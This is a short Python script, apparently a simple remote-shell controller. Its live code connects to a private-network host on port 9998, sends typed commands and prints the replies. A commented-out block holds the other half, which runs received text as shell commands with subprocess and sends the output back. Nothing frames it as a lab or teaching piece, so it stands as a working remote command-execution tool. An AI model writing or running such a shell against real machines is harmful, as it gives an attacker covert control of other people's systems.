import socket
import os
import subprocess

s = socket.socket() 
host = "192.168.1.104"
port = 9998

s.connect((host,port))

while True:
    cmd = input()
    if(cmd=="q"):
        s.close()
        break

    if(len(cmd) > 0):
        s.send(str.encode(cmd))
        client_response = str(s.recv(1024),"utf-8")
        print(client_response, end="")
print("goodbye")

    # data = s.recv(1024)
    # if(data[:2].decode("utf-8") == "cd"):
    #     os.chdir(data[3:].decode("utf-8"))
    # if(len(data)>0):
    #     cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout = subprocess.PIPE, stdin = subprocess.PIPE, stderr=subprocess.PIPE)
    #     output_byte = cmd.stdout.read() + cmd.stderr.read()
    #     output_str = str(output_byte,"utf-8")
    #     current_wd = os.getcwd() + "> "
    #     s.send(str.encode(output_str + current_wd))
    #     print(output_str)